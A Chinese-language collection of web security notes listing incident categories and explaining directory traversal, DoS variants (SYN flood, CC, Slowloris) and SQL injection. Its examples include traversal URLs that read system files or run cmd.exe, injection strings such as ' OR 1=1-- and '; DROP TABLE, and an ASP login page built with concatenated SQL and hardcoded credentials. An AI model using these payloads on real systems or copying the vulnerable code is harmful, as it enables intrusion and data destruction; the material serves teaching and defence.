# AttackType {#attacktype}

MI ：有害程序事件（Malware Incidents）

CVI：计算机病毒事件（Computer Virus Incidents）

WI：蠕虫事件（Worms Incidents）

THI：特洛伊木马事件（Trojan Horses Incidents）

BI：僵尸网络事件（Botnets Incidents）

BAI：混合攻击程序事件（Blended Attacks Incidents）

WBPI：网页内嵌恶意代码事件（Web Browser Plug-Ins Incidents）

NAI：网络攻击事件（Network Attacks Incidents）

DOSAI：拒绝服务攻击事件（Denial of Service Attacks Incidents）

BDAI：后门攻击事件（Backdoor Attacks Incidents）

VAI：漏洞攻击事件（Vulnerability Attacks Incidents） N

SEI：网络扫描窃听事件（Network Scan &amp; Eavesdropping Incidents）

PI：网络钓鱼事件（Phishing Incidents）

II：干扰事件（Interference Incidents）

IDI：信息破坏事件（Information Destroy Incidents）

IAI：信息篡改事件（Information Alteration Incidents）

IMI：信息假冒事件（Information Masquerading Incidents）

ILEI：信息泄漏事件（Information Leakage Incidents）

III：信息窃取事件（Information Interception Incidents）

ILOI：信息丢失事件（Information Loss Incidents）

ICSI：信息内容安全事件（Information Content Security Incidents）

FF：设备设施故障（Facilities Faults）

SHF：软硬件自身故障（Software and Hardware Faults）

PSFF：外围保障设施故障（Periphery Safeguarding Facilities Faults）

MDA：人为破坏事故（Man-made Destroy Accidents）

DI：灾害性事件（Disaster Incidents）

OI：其他事件（Other Incidents）

### Directory Traversal {#directory-traversal}

对于一个安全的Web服务器来说，对Web内容进行恰当的访问控制是极为关键的。目录遍历是Http所存在的一个安全漏洞，它使得攻击者能够访问受限制的目录，并在Web服务器的根目录以外执行命令。

　　Web服务器主要提供两个级别的安全机制：

　　访问控制列表--就是我们常说的ACL

　　根目录访问

　　访问控制列表是用于授权过程的，它是一个Web服务器的管理员用来说明什么用户或用户组能够在服务器上访问、修改和执行某些文件的列表，同时也包含了其他的一些访问权限内容。

　　根目录是服务器文件系统中一个特定目录，它往往是一个限制，用户无法访问位于这个目录之上的任何内容。

　　例如：在Windows的IIS其默认的根目录是C:\Inetpub\wwwroot，那么用户一旦通过了ACL的检查，就可以访问C:\Inetpub\wwwroot\news目录以及其他位于这个根目录以下的所有目录和文件，但无法访问C:\Windows目录。

　　根目录的存在能够防止用户访问服务器上的一些关键性文件，譬如在Windows平台上的cmd.exe或是Linux/Unix平台上的口令文件。

　　这个漏洞可能存在于Web服务器软件本身，也可能存在于Web应用程序的代码之中。

　　要执行一个目录遍历攻击，攻击者所需要的只是一个web浏览器，并且有一些关于系统的一些缺省文件和目录所存在的位置的知识即可。

　　如果你的站点存在这个漏洞，攻击者可以用它来做些什么?

　　利用这个漏洞，攻击者能够走出服务器的根目录，从而访问到文件系统的其他部分，譬如攻击者就能够看到一些受限制的文件，或者更危险的，攻击者能够执行一些造成整个系统崩溃的指令。

　　依赖于web站点的访问是如何设置的，攻击者能够仿冒成站点的其他用户来执行操作，而这就依赖系统对Web站点的用户是如何授权的。

　　利用Web应用代码进行目录遍历攻击的实例

　　在包含动态页面的Web应用中，输入往往是通过GET或是POST的请求方法从浏览器获得，以下是一个GET的Http URL请求示例：

　　 [http://test.webarticles.com/show.asp?view=oldarchive.html](http://test.webarticles.com/show.asp?view=oldarchive.html)

　　利用这个URL，浏览器向服务器发送了对动态页面show.asp的请求，并且伴有值为oldarchive.html的view参数，当请求在Web服务器端执行时，show.asp会从服务器的文件系统中取得oldarchive.html文件，并将其返回给客户端的浏览器，那么攻击者就可以假定show.asp能够从文件系统中获取文件并编制如下的URL：

　　 [http://test.webarticles.com/show.asp?view=../../../../../Windows/system.ini](http://test.webarticles.com/show.asp?view=../../../../../Windows/system.ini)

　　那么，这就能够从文件系统中获取system.ini文件并返回给用户，../的含义这里就不用多说了，相信大家都会明白。攻击者不得不去猜测需要往上多少层才能找到Windows目录，但可想而知，这其实并不困难，经过若干次的尝试后总会找到的。

利用Web服务器进行目录遍历攻击的实例：

　　除了Web应用的代码以外，Web服务器本身也有可能无法抵御目录遍历攻击。这有可能存在于Web服务器软件或是一些存放在服务器上的示例脚本中。

　　在最近的Web服务器软件中，这个问题已经得到了解决，但是在网上的很多Web服务器仍然使用着老版本的IIS和Apache，而它们则可能仍然无法抵御这类攻击。即使你使用了已经解决了这个漏洞的版本的Web服务器软件，你仍然可能会有一些对黑客来说是很明显的存有敏感缺省脚本的目录。

　　例如，如下的一个URL请求，它使用了IIS的脚本目录来移动目录并执行指令： [http://server.com/scripts/..%5c../Windows/System32/cmd.exe?/c+dir+c:\](http://server.com/scripts/..%5c../Windows/System32/cmd.exe?/c+dir+c:)

　　这个请求会返回C:\目录下所有文件的列表，它使通过调用cmd.exe然后再用dir c:\来实现的，%5c是web服务器的转换符，用来代表一些常见字符，这里表示的是&quot;\&quot;

　　新版本的Web服务器软件会检查这些转换符并限制它们通过，但对于一些老版本的服务器软件仍然存在这个问题。

　　如何判断是否存在目录遍历漏洞?

　　最好的方式就是使用Web漏洞扫描器，Web漏洞扫描器能够遍历你Web站点的所有目录以判断是否存在目录遍历漏洞，如果有它会报告该漏洞并给出解决的方法，除了目录遍历漏洞以外，Web应用扫描还能检查SQL注入、跨站点脚本攻击以及其他的漏洞。

### DOS {#dos}

拒绝服务，英文为&quot;Denial of Service&quot;，也就是我们常说的DoS。那什么又是拒绝服务呢？大家可以这样理解，凡是能导致合法用户不能进行正常的网络服务的行为都算是拒绝服务攻击。拒绝服务攻击的目的非常的明确，就是要阻止合法用户对正常网络资源的访问，从而达到攻击者不可告人的目的。

简单的讲，拒绝服务就是用超出被攻击目标处理能力的海量数据包消耗可用系统、带宽资源，致使网络服务瘫痪的一种攻击手段。在早期，拒绝服务攻击主要是针对处理能力比较弱的单机，如个人PC，或是窄带宽连接的网站，对拥有高带宽连接，高性能设备的网站影响不大。

在1999年底，伴随着DDoS的出现，高端网站高枕无忧的局面不复存在。DDoS实现是借助数百，甚至数千台被植入攻击守护进程的攻击主机同时发起的集团作战行为。因此，分布式拒绝服务也被称之为&quot;洪水攻击&quot;。常见的DDoS攻击手法有UDP Flood、SYN Flood、ICMP Flood、TCP Flood、Proxy Foold等等。 DDoS攻击原理图如下：

DDOS攻击的简单分类

1.基于操作系统/应用软件漏洞的应用层D-DoS攻击：

四两拨千斤的攻击方式，发送少量数据导致攻击目标系统资源被大幅占用，以达到拒绝服务的目的。在某些情况下，甚至一台攻击机即可完成这类攻击。

2.基于IP协议漏洞的网络层D-DoS攻击：

最常见的攻击方式，利用TCP协议的漏洞，导致攻击目标的系统资源被大幅占用。需要一定规模的傀儡机才能达到较好的拒绝服务效果。

3.面向网络资源的D-DoS攻击    

最难以防范的攻击方式。攻击者通过控制大量傀儡机同时发送正常报文，导致攻击目标之前的网络带宽、路由器、防火墙或防D-DoS网关甚至服务器本身的资源耗尽。需要控制极大规模的傀儡机或大量服务器才能达到资源占用的效果。原理图如下：

DDoS是一种特殊形式的拒绝服务攻击，所以对付它是一个系统工程，想仅仅依靠某种系统或产品防范DDoS是不现实的。可以肯定的是，要想完全杜绝 DDoS目前是不可能的，但是通过适当的措施抵御90%的DDoS攻击是可以做到的。对于此类隐蔽性极好的DDoS攻击的防范，更重要的是用户要加强安全防范意识，提高网络系统的安全性。

+++

　　CC = Challenge Collapsar，其前身名为Fatboy攻击，Collapsar(黑洞) 是绿盟科技的一款抗DDOS产品品牌，在对抗拒绝服务攻击的领域内具有比较高的影响力和口碑。 因此，存在这样一种拒绝攻击行为，可以将受到Collapsar （黑洞）防火墙保护的网站击溃，因此攻击发起者挑衅式的将其更名为Challenge Collapsar 攻击，简称CC攻击。

攻击原理

　　CC攻击的原理并不复杂，其主要思路是基于应用层的弱点进行攻击；传统的拒绝服务攻击，如Syn flood 主要是基于协议层和服务层的弱点开展攻击，早期的抗拒绝服务攻击产品也是基于此进行防护。而应用层的弱点，取决于各自应用平台的开发能力，因此难以具有通用性的防护方案，这也是CC攻击没有很好的防护产品，非常容易得手的原因。

　　简单举例，一个论坛系统，如果存在较多的分页，当一个蜘蛛程序，多并发高频次的进行大量翻页抓取时，已经产生了一种CC攻击。

　　应用层常见SQL代码范例如下(以php为例)

　　$sql=&quot;select * from post where tagid=&amp;apos;$tagid&amp;apos; order by postid desc limit $start ,30&quot;;

　　当post表数据庞大，翻页频繁，$start数字急剧增加时，查询影响结果集=$start+30; 该查询效率呈现明显下降趋势，而多并发频繁调用，因查询无法立即完成，资源无法立即释放，会导致数据库请求连接过多，导致数据库阻塞，网站无法正常打开。

　　性能不够优良的数据查询，不良的程序执行结构，比较消耗资源的功能，都可能成为CC攻击的目标，而执行方法可能是单机发起，也可能是通过肉鸡发起，还有可能通过高流量站点嵌入脚本（iframe嵌入或js嵌入）发起，基于高流量网站嵌入攻击代码的CC攻击，在目前互联网环境上来讲，更加无解。

　　CC攻击可以归为DDoS攻击的一种。他们之间都原理都是一样的，即发送大量的请求数据来导致服务器拒绝服务，是一种连接攻击。CC攻击又可分为代理 CC攻击，和肉鸡CC攻击。代理CC攻击是黑客借助代理服务器生成指向受害主机的合法网页请求，实现DOS，和伪装就叫：cc（ChallengeCollapsar）。而肉鸡CC攻击是黑客使用CC攻击软件，控制大量肉鸡，发动攻击，相比来后者比前者更难防御。因为肉鸡可以模拟正常用户访问网站的请求。伪造成合法数据包。防御CC攻击可以通过多种方法，禁止网站代理访问，尽量将网站做成静态页面，限制连接数量等。

#### ICMP Flood {#icmp-flood}

#### UDP Flood {#udp-flood}

#### SYN Flood {#syn-flood}

TCP 三次握手

第三次握手中，如果服务器没有收到客户端的最终ACK确认报文，会一直处于SYN_RECV状态，将客户端IP加入等待列表，并重发第三步SNY+ACK报文。重发进行3-5次，大约间隔30秒左右轮询一次等待列表重试所有客户端。另一方面，服务器在自己发出了SYN+ACK报文后，会与分配资源为即将建立的TCP连接存储信息做准备，这个资源在等待重试期间一直保留。更为重要的是，服务器资源有限，可以维护的SYN_RECV状态超过极限后就不再接受新的SYN报文，也就是拒绝新的TCP连接建立。

攻击者伪装大量的IP地址给服务器发送SYN报文，由于伪造的IP地址几乎不可能存在，也就几乎不可能返回任何应答。因此服务器会维护一个庞大的等待队列，不停的重试发送SYN+ACK报文，同时占用着大量的资源无法释放，而且服务器将不能在接受新的SYN请求。合法用户无法完成3次握手！

工具： [http://www.icylife.net/yunshu/show.php?id=367](http://www.icylife.net/yunshu/show.php?id=367)

#### DNS Query Flood {#dns-query-flood}

#### HTTP Flood(CC) {#http-flood-cc}

CC 攻击可以归为DDoS攻击的一种。他们之间的原理都是一样的，即发送大量的请求数据来导致服务器拒绝服务，是一种连接攻击。

CC攻击又可分为代理CC攻击，和肉鸡CC攻击。

代理CC攻击是黑客借助代理服务器生成指向受害主机的合法网页请求，实现DOS，和伪装就叫：cc（Challenge Collapsar）。

肉鸡CC攻击是黑客使用CC攻击软件，控制大量肉鸡，发动攻击，相比来后者比前者更难防御。因为肉鸡可以模拟正常用户访问网站的请求。伪造成合法数据包。

#### Sloworis {#sloworis}

慢速连接攻击

HTTP协议规定，HTTP Request以\r\n\r\n结尾表示客户端发送结束，服务端开始处理。

攻击者在HTTP请求中将Connection设置为keep-alive,要求web服务器保持TCP连接不要断开，随后缓慢的每个几分钟发送一个key-value格式的数据到服务端，如a:b\r\n,导致服务端认为HTTP头部没有接收完而一直等待。

工具：

ha.ckers.org/slowloris/slowloris.pl

变种：使用POST的方法向Web Server提交数据、填充一个大大Content-Length但缓慢的一个字节一个字节的POST真正数据内容。

### SQL inject {#sql-inject}

[http://netsecurity.51cto.com/art/201108/287651.htm](http://netsecurity.51cto.com/art/201108/287651.htm)

#### SQL inject OverView {#sql-inject-overview}

[http://netsecurity.51cto.com/art/201108/287651.htm](http://netsecurity.51cto.com/art/201108/287651.htm)

SQL 注入：利用现有应用程序，将(恶意)的SQL命令注入到后台数据库引擎执行的能力，这是SQL注入的标准释义。

随着B/S模式被广泛的应用，用这种模式编写应用程序的程序员也越来越多，但由于开发人员的水平和经验参差不齐，相当一部分的开发人员在编写代码的时候，没有对用户的输入数据或者是页面中所携带的信息（如Cookie）进行必要的合法性判断，导致了攻击者可以提交一段数据库查询代码，根据程序返回的结果，获得一些他想得到的数据。

SQL注入利用的是正常的HTTP服务端口，表面上看来和正常的web访问没有区别，隐蔽性极强，不易被发现。

SQL注入过程

第一步：判断Web环境是否可以SQL注入。如果URL仅是对网页的访问，不存在SQL注入问题，如： [http://news.xxx.com.cn/162414739931.shtml](http://news.xxx.com.cn/162414739931.shtml) 就是普通的网页访问。只有对数据库进行动态查询的业务才可能存在SQL注入，如： [http://www.google.cn/webhp?id](http://www.google.cn/webhp?id) ＝39，其中?id＝39表示数据库查询变量，这种语句会在数据库中执行，因此可能会给数据库带来威胁。

第二步：寻找SQL注入点。完成上一步的片断后，就要寻找可利用的注入漏洞，通过输入一些特殊语句，可以根据浏览器返回信息，判断数据库类型，从而构建数据库查询语句找到注入点。

第三步：猜解用户名和密码。数据库中存放的表名、字段名都是有规律可言的。通过构建特殊数据库语句在数据库中依次查找表名、字段名、用户名和密码的长度，以及内容。这个猜测过程可以通过网上大量注入工具快速实现，并借助破解网站轻易破译用户密码。

第四步：寻找WEB管理后台入口。通常WEB后台管理的界面不面向普通用户

开放，要寻找到后台的登陆路径，可以利用扫描工具快速搜索到可能的登陆地址，依次进行尝试，就可以试出管理台的入口地址。

第五步：入侵和破坏。成功登陆后台管理后，接下来就可以任意进行破坏行为，如篡改网页、上传木马、修改、泄漏用户信息等，并进一步入侵数据库服务器。

SQL注入攻击的特点:

变种极多，有经验的攻击者会手动调整攻击参数，致使攻击数据的变种是不可枚举的，这导致传统的特征匹配检测方法仅能识别相当少的攻击，难以防范。

攻击过程简单，目前互联网上流行众多的SQL注入攻击工具，攻击者借助这些工具可很快对目标WEB系统实施攻击和破坏。

危害大，由于WEB编程语言自身的缺陷以及具有安全编程能力的开发人员少之又少，大多数WEB业务系统均具有被SQL注入攻击的可能。而攻击者一旦攻击成功，可以对控制整个WEB业务系统，对数据做任意的修改，破坏力达到及至。

[http://www.51testing.com/html/33/n-200933.html](http://www.51testing.com/html/33/n-200933.html) 如何防范SQL注入--编程篇

[http://www.51testing.com/html/40/n-201140.html](http://www.51testing.com/html/40/n-201140.html)  如何防范SQL注入--测试篇

[http://www.51testing.com/html/43/n-86043.html](http://www.51testing.com/html/43/n-86043.html) SQL注入攻击的种类和防范手段

#### SQL inject Principle {#sql-inject-principle}

[http://netsecurity.51cto.com/art/200808/87178.htm](http://netsecurity.51cto.com/art/200808/87178.htm)

一、注射式攻击的原理

注射式攻击的根源在于，程序命令和用户数据（即用户输入）之间没有做到泾渭分明。这使得攻击者有机会将程序命令当作用户输入的数据提交给We程序，以发号施令，为所欲为。

为了发动注射攻击，攻击者需要在常规输入中混入将被解释为命令的&quot;数据&quot;，要想成功，必须要做三件事情：

1.确定Web应用程序所使用的技术

注射式攻击对程序设计语言或者硬件关系密切，但是这些可以通过适当的踩点或者索性将所有常见的注射式攻击都搬出来逐个试一下就知道了。为了确定所采用的技术，攻击者可以考察Web页面的页脚，查看错误页面，检查页面源代码，或者使用诸如Nessus等工具来进行刺探。

2.确定所有可能的输入方式

Web应用的用户输入方式比较多，其中一些用户输入方式是很明显的，如HTML表单；另外，攻击者可以通过隐藏的HTML表单输入、HTTP头部、 cookies、甚至对用户不可见的后端AJAX请求来跟Web应用进行交互。一般来说，所有HTTP的GET和POST都应当作用户输入。为了找出一个 Web应用所有可能的用户输入，我们可以求助于Web代理，如Burp等。

3.查找可以用于注射的用户输入

在找出所有用户输入方式后，就要对这些输入方式进行筛选，找出其中可以注入命令的那些输入方式。这个任务好像有点难，但是这里有一个小窍门，那就是多多留意Web应用的错误页面，很多时候您能从这里得到意想不到的收获。

二、SQL注射原理

上面对注射攻击做了一般性的解释，下面我们以SQL注射为例进行讲解，以使读者对注射攻击有一个感性的认识，至于其他攻击，原理是一致的。

SQL注射能使攻击者绕过认证机制，完全控制远程服务器上的数据库。SQL是结构化查询语言的简称，它是访问数据库的事实标准。目前，大多数Web 应用都使用SQL数据库来存放应用程序的数据。几乎所有的Web应用在后台都使用某种SQL数据库。跟大多数语言一样，SQL语法允许数据库命令和用户数据混杂在一起的。如果开发人员不细心的话，用户数据就有可能被解释成命令，这样的话，远程用户就不仅能向Web应用输入数据，而且还可以在数据库上执行任意命令了。

三、绕过用户认证

我们这里以一个需要用户身份认证的简单的Web应用程序为例进行讲解。假定这个应用程序提供一个登录页面，要求用户输入用户名和口令。用户通过 HTTP请求发送他们的用户名和口令，之后，Web应用程序检查用户传递来用户名和口令跟数据库中的用户名和口令是否匹配。这种情况下，会要求在SQL数据库中使用一个数据库表。开发人员可以通过以下SQL语句来创建表：

CREATE TABLE user_table

(id             INTEGER           PRIMARYKEY,

username   VARCHAR(32),

password   VARCHAR(41)

);

上面的SQL代码将建立一个表，该表由三栏组成。

第一栏存放的是用户ID，如果某人经过认证，则用此标识该用户。

第二栏存放的是用户名，该用户名最多由32字符组成。

第三栏存放的是口令，它由用户的口令的hash值组成，因为以明文的形式来存放用户的口令实在太危险，所以通常取口令的散列值进行存放。

我们将使用SQL函数PASSWORD（）来获得口令的hash值，在MySQL中，函数PASSWORD（）的输出由41字符组成。

对一个用户进行认证，实际上就是将用户的输入即用户名和口令跟表中的各行进行比较，

如果跟某行中的用户名和口令跟用户的输入完全匹配，那么该用户就会通过认证，并得到该行中的ID。

假如用户提供的用户名和口令分别为lonelynerd15和mypassword，那么检查用户ID过程如下所示：

SELECT id FROM user_table WHERE username= &amp;apos;lonelynerd15&amp;apos; AND password= PASSWORD(&amp;apos;mypassword&amp;apos;)&lt; /FONT&gt;

如果该用户位于数据库的表中，这个SQL命令将返回该用户相应的ID，这就意味着该用户通过了认证；否则，这个SQL命令的返回为空，这意味着该用户没有通过认证。

下面是用来实现自动登录的Java代码，它从用户那里接收用户名和口令，然后通过一个SQL查询对用户进行认证：

Stringusername=req.getParameter(&quot;username&quot;);

Stringpassword=req.getParameter(&quot;password&quot;);

Stringquery= &quot;SELECTidFROMuser_table WHERE&quot;+&quot;username=&amp;apos;&quot;+username+&quot;&amp;apos;AND&quot;+&quot;password=PASSWORD(&amp;apos;&quot;+password+&quot;&amp;apos;)&quot;;

ResultSetrs=stmt.executeQuery(query);

intid=-1;//-1 implies that the user is unauthenticated.

while(rs.next()){

id=rs.getInt(&quot;id&quot;);

}

开头两行代码从HTTP请求中取得用户输入，然后在下一行开始构造一个SQL查询。执行查询，然后在while（）循环中得到结果，如果一个用户名和口令对匹配，就会返回正确的ID。否则，id的值仍然为-1，这意味着用户没有通过认证。表面上看，如果用户名和口令对匹配，那么该用户通过认证；否则，该用户不会通过认证--但是，事实果真如此吗？非也！读者也许已经注意到了，这里并没有对SQL命令进行设防，所以攻击者完全能够在用户名或者口令字段中注入 SQL语句，从而改变SQL查询。为此，我们仔细研究一下上面的SQL查询字符串：

SELECT idFROMuser_table WHERE&quot;+&quot;username=&amp;apos;&quot;+username+&quot;&amp;apos;AND&quot;+&quot;password=PASSWORD(&amp;apos;&quot;+password+&quot;&amp;apos;)；

上述代码认为字符串username和password都是数据，不过，攻击者却可以随心所欲地输入任何字符。如果一位攻击者输入的用户名为

&amp;apos;OR1=1-

而口令为

x

那么查询字符串将变成下面的样子：

SELECT idFROMuser_tableWHEREusername=&amp;apos;&amp;apos;OR1=1--&amp;apos;ANDpassword=PASSWORD(&amp;apos;x&amp;apos;)

该双划符号--告诉SQL解析器，右边的东西全部是注释，所以不必理会。这样，查询字符串相当于：

SELECT id FROM user_tableWHEREusername=&amp;apos;&amp;apos;OR1=1

如今的SELECT语句跟以前的已经大相径庭了，因为现在只要用户名为长度为零的字符串&amp;apos;&amp;apos;或1=1这两个条件中一个为真，就返回用户标识符ID--我们知道，1=1是恒为真的。所以这个语句将返回user_table中的所有ID。在此种情况下，攻击者在username字段放入的是SQL指令&amp;apos;OR1=1--而非数据。

四、构造SQL注射代码

为了成功地注入SQL命令，攻击者必须将开发人员的现有SQL命令转换成一个合法的SQL语句，当然，要盲注是有些难度的，但一般都是这样：

&amp;apos;OR1=1-

或者

&amp;apos;)OR1=1--

此外，许多Web应用提供了带来错误报告和调试信息，例如，利用&amp;apos;OR1=1--对Web应用进行盲注时，经常看到如下所示的错误信息：

Error executing query:

You have an error in your SQLsyntax;

check the manual that corresponds to your MySQL server version for the right syntax to use near

&amp;apos;SELECT(title,body) FROM blog_table WHEREcat=&amp;apos;OR1=1&amp;apos;atline1

该错误信息详细地为我们展示了完整的SQL语句，在此种情况下，SQL数据库所期待的好象是一个整数，而非字符串，所以可以注入字符串OR1=1--，把单引号去掉就应该能成功注入了。对于大多数SQL数据库，攻击者可以在一行中放入多个SQL语句，只要各个语句的语法没有错误就行。在下面的代码中，我们展示了如何将username设为&amp;apos;OR1=1并把password设为x来返回最后的用户ID：

Stringquery=&quot;SELECTidFROMuser_tableWHERE&quot;+&quot;username=&amp;apos;&quot;+username+&quot;&amp;apos;AND&quot;+&quot;password=PASSWORD(&amp;apos;&quot;+password+&quot;&amp;apos;)&quot;;

当然，攻击者可以注入其它的查询，例如，把username设为：

&amp;apos;OR1=1;DROP TABLE user_table;--

而这个查询将变成：

SELECT id FROM user_table WHERE username=&amp;apos;&amp;apos;OR1=1;DROP TABLE user_table;--&amp;apos;AND password=PASSWORD(&amp;apos;x&amp;apos;);

它相当于：

SELECT id FROM user_table WHERE username=&amp;apos;&amp;apos;OR1=1;DROP TABLE user_table;

这个语句将执行句法上完全正确的SELECT语句，并利用SQLDROP命令清空user_table。

注射式攻击不必非要进行盲式攻击，因为许多Web应用是利用开放源代码工具开发的，为了提高注射式攻击的成功率，我们可以下载免费的或者产品的试用版，然后在自己的系统上搭建测试系统。如果在测试系统上发现了错误，那么很可能同样的问题也会存在于所有使用该工具的Web应用身上。

五、小结

我们在本文中向读者介绍了注射攻击的根本原因，即没有对数据和命令进行严格区分。然后通过一些程序源码对SQL的攻击进行了细致的分析，使我们对 SQL注射机理有了一个深入的认识。如果您是一名web应用开发人员，那么您就当心了，一定不要盲目相信用户端的输入，而要对用户输入的数据进行严格的 &quot;消毒&quot;处理，否则的话，SQL注射将会不期而至。

#### SQL inject MS SQL Server {#sql-inject-ms-sql-server}

[http://bbs.51cto.com/thread-886-1.html](http://bbs.51cto.com/thread-886-1.html)

SQL Server 应用程序中的高级SQL注入

摘要：

这份文档是详细讨论SQL注入技术，它适应于比较流行的IIS+ASP+SQLSERVER平台。它讨论了哪些SQL语句能通过各种各样的方法注入到应用程序中，并且记录与攻击相关的数据确认和数据库锁定。

这份文档的预期读者为与数据库通信的WEB程序的开发者和那些扮演审核WEB应用程序的安全专家。

介绍：

SQL是一种用于关系数据库的结构化查询语言。它分为许多种，但大多数都松散地基于美国国家标准化组织最新的标准SQL-92。典型的执行语句是 query，它能够收集比较有达标性的记录并返回一个单一的结果集。SQL语言可以修改数据库结构（数据定义语言）和操作数据库内容（数据操作语言）。在这份文档中，我们将特别讨论SQLSERVER所使用的Transact-SQL语言。

当一个攻击者能够通过往query中插入一系列的sql语句来操作数据写入到应用程序中去，我们管这种方法定义成SQL注入。

一个典型的SQL语句如下：

Select id,forename,surname from authors

这条语句将返回authors表中所有行的id，forename和surname列。这个结果可以被限制，例如：

Select id,forename,surname from authors where forename&amp;apos;john&amp;apos; and surname=&amp;apos;smith&amp;apos;

需要着重指明的是字符串&amp;apos;john&amp;apos;和&amp;apos;smith&amp;apos;被单引号限制。明确的说，forename和surname字段是被用户提供的输入限制的，攻击者可以通过输入值来往这个查询中注入一些SQL语句，

如下：

Forename：jo&amp;apos;hn

Surname：smith

查询语句变为：

Select id,forename,surname from authors where forename=&amp;apos;jo&amp;apos;hn&amp;apos; and surname=&amp;apos;smith&amp;apos;

当数据库试图去执行这个查询时，它将返回如下错误：

Server：Msg 170, Level 15, State 1, Line 1

Line 1：Incorrect syntax near &amp;apos;hn&amp;apos;

造成这种结果的原因是插入了.作为定界符的单引号。数据库尝试去执行&amp;apos;hn&amp;apos;，但是失败。如果攻击者提供特别的输入如：

Forename：jo&amp;apos;;drop table authors-

Surname：

结果是authors表被删除，造成这种结果的原因我们稍后再讲。

看上去好象通过从输入中去掉单引号或者通过某些方法避免它们都可以解决这个问题。这是可行的，但是用这种方法做解决方法会存在几个困难。第一，并不是所有用户提供的数据都是字符串。如果用户输入的是通过用户id来查询author，那我们的查询应该像这样：

Select id,forename,surname from authors where id=1234

在这种情况下，一个攻击者可以非常简单地在数字的结尾添加SQL语句，在其他版本的SQL语言中，使用各种各样的限定符号；在数据库管理系统JET引擎中，数据可以被使用&amp;apos;#&amp;apos;限定。第二，避免单引号尽管看上去可以，但是是没必要的，原因我们稍后再讲。

我们更进一步地使用一个简单的ASP登陆页面来指出哪些能进入SQLSERVER数据库并且尝试鉴别进入一些虚构的应用程序的权限。

这是一个提交表单页的代码，让用户输入用户名和密码：

&lt;HTML&gt;

&lt;HEAD&gt;

&lt;TITLE&gt;Login Page&lt;/TITLE&gt;

&lt;/HEAD&gt;

&lt;BODY bgcolor=&amp;apos;000000&amp;apos; text=&amp;apos;cccccc&amp;apos;&gt;

&lt;FONT Face=&amp;apos;tahoma&amp;apos; color=&amp;apos;cccccc&amp;apos;&gt;

&lt;CENTER&gt;&lt;H1&gt;Login&lt;/H1&gt;

&lt;FORM action=&amp;apos;process_loginasp&amp;apos; method=post&gt;

&lt;TABLE&gt;

&lt;TR&gt;&lt;TD&gt;Username：&lt;/TD&gt;&lt;TD&gt;&lt;INPUT type=text name=username size=100 width=100&gt;&lt;/TD&gt;&lt;/TR&gt;

&lt;TR&gt;&lt;TD&gt;Password：&lt;/TD&gt;&lt;TD&gt;&lt;INPUT type=password name=password size=100 withd=100&gt;&lt;/TD&gt;&lt;/TR&gt;

&lt;/TABLE&gt;

&lt;INPUT type=submit value=&amp;apos;Submit&amp;apos;&gt;&lt;INPUT type=reset value=&amp;apos;Reset&amp;apos;&gt;

&lt;/FORM&gt;

&lt;/Font&gt;

&lt;/BODY&gt;

&lt;/HTML&gt;

下面是process_login.asp的代码，它是用来控制登陆的：

&lt;HTML&gt;

&lt;BODY bgcolor=&amp;apos;000000&amp;apos; text=&amp;apos;ffffff&amp;apos;&gt;

&lt;FONT Face=&amp;apos;tahoma&amp;apos; color=&amp;apos;ffffff&amp;apos;&gt;

&lt;STYLE&gt;

p { font-size=20pt ! important}

font { font-size=20pt ! important}

h1 { font-size=64pt ! important}

&lt;/STYLE&gt;

&lt;%@LANGUAGE = JScript %&gt;

&lt;%

function trace( str ) {

if( Request.form(&quot;debug&quot;) == &quot;true&quot; )

Response.write( str );

}

function Login( cn ) {

var username;

var password;

username = Request.form(&quot;username&quot;);

password = Request.form(&quot;password&quot;);

var rso = Server.CreateObject(&quot;ADODB.Recordset&quot;);

var sql = &quot;select * from users where username = &amp;apos;&quot; + username + &quot;&amp;apos; and password = &amp;apos;&quot; + password + &quot;&amp;apos;&quot;; trace( &quot;query: &quot; + sql );

rso.open( sql, cn );

if (rso.EOF) {

rso.close();

%&gt;

&lt;FONT Face=&amp;apos;tahoma&amp;apos; color=&amp;apos;cc0000&amp;apos;&gt;

&lt;H1&gt; &lt;BR&gt;&lt;BR&gt;

&lt;CENTER&gt;ACCESS DENIED&lt;/CENTER&gt;

&lt;/H1&gt;

&lt;/BODY&gt;

&lt;/HTML&gt;

&lt;% Response.end return; }

else {

Session(&quot;username&quot;) = &quot;&quot; + rso(&quot;username&quot;);

%&gt;

&lt;FONT Face=&amp;apos;tahoma&amp;apos; color=&amp;apos;00cc00&amp;apos;&gt;

&lt;H1&gt; &lt;CENTER&gt;ACCESS GRANTED&lt;BR&gt; &lt;BR&gt;

Welcome, &lt;% Response.write(rso(&quot;Username&quot;)); Response.write( &quot;&lt;/BODY&gt;&lt;/HTML&gt;&quot; ); Response.end }

}

function Main() { //Set up connection

var username

var cn = Server.createobject( &quot;ADODB.Connection&quot; );

cn.connectiontimeout = 20;

cn.open( &quot;localserver&quot;, &quot;sa&quot;, &quot;password&quot; );

username = new String( Request.form(&quot;username&quot;) );

if( username.length &gt; 0) {

Login( cn );

}

cn.close();

}

Main();

%&gt;

出现问题的地方是process_lgin.asp中产生查询语句的部分：

Var sql=&quot;select * from users where username=&amp;apos;&quot;+username+&quot;&amp;apos; and password=&amp;apos;&quot;+password+&quot;&amp;apos;&quot;;

如果用户输入的信息如下：

Username：&amp;apos;;drop table users-

Password：

数据库中表users将被删除，拒绝任何用户进入应用程序。&amp;apos;-&amp;apos;符号在Transact-SQL中表示忽略&amp;apos;-&amp;apos;以后的语句，&amp;apos;;&amp;apos;符号表示一个查询的结束和另一个查询的开始。&amp;apos;-&amp;apos;位于username字段中是必须的，它为了使这个特殊的查询终止，并且不返回错误。

攻击者可以只需提供他们知道的用户名，就可以以任何用户登陆，使用如下输入：

Username：admin&amp;apos;-

攻击者可以使用users表中第一个用户，输入如下：

Username：&amp;apos; or 1=1-

更特别地，攻击者可以使用完全虚构的用户登陆，输入如下：

Username：&amp;apos; union select 1,&amp;apos;fictional_user&amp;apos;,&amp;apos;some_password&amp;apos;,1-

这种结果的原因是应用程序相信攻击者指定的是从数据库中返回结果的一部分。

通过错误消息获得信息

这个几乎是David Litchfield首先发现的，并且通过作者渗透测试的；后来David写了一份文档，后来作者参考了这份文档。这些解释讨论了&amp;apos;错误消息&amp;apos;潜在的机制，使读者能够完全地了解它，潜在地引发他们的能力。

为了操作数据库中的数据，攻击者必须确定某些数据库和某些表的结构。例如我们可以使用如下语句创建user表：

Create talbe users(

Id int,

Username varchar(255),

Password varchar(255),

Privs int

)

然后将下面的用户插入到users表中：

Insert into users values(0,&amp;apos;admin&amp;apos;,&amp;apos;r00tr0x!&amp;apos;,0xffff)

